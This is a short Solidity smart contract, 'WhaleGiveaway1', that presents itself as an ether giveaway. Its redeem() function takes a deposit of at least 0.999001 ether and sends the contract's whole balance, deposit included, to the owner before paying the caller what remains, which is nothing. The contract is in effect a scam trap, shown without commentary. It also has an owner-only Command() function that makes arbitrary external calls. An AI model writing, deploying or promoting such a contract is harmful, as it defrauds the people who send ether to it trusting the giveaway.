pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner;
    uint public constant minEligibility = 0.999001 ether;

    function WhaleGiveaway1() public {
        Owner = msg.sender;
    }

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        require(adr.call.value(msg.value)(data));
    }
}